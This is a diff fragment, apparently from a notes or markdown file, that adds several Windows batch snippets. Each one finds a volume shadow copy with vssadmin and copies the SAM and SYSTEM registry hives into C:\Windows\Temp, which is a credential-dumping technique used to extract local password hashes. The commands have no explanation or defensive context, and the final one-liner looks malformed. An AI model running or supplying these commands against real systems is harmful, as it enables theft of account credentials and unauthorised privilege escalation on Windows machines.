@@ -2,6 +2,30 @@
 
 
 ```
+@echo off
+set "dev="
+for /f "tokens=2 delims=?" %%A in ('vssadmin list shadows ^| findstr /i /C:"GLOBALROOT"') do set "dev=%%A"
+
+echo Using snapshot: \\?\%dev%
+copy "\\?\%dev%\Windows\System32\config\SAM"    C:\Windows\Temp\sam.hive
+copy "\\?\%dev%\Windows\System32\config\SYSTEM" C:\Windows\Temp\system.hive
+
+```
+```
+set "sp=\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1"
+copy "%sp%\Windows\System32\config\SAM" C:\Windows\Temp\sam.hive
+copy "%sp%\Windows\System32\config\SYSTEM" C:\Windows\Temp\system.hive
+
+```
+
+
+```
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Windows\Temp\sam.hive
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\system.hive
+```
+
+
+```
 for /f "tokens=2 delims=:" %i in ('vssadmin list shadows ^| findstr "GLOBALROOT"') do (set "sp=%i" & call copy "%sp:\=%\Windows\System32\config\SAM" "C:\Windows\Temp\sam.hive" & call copy "%sp:\=%\Windows\System32\config\SYSTEM" "C:\Windows\Temp\system.hive")
 
  
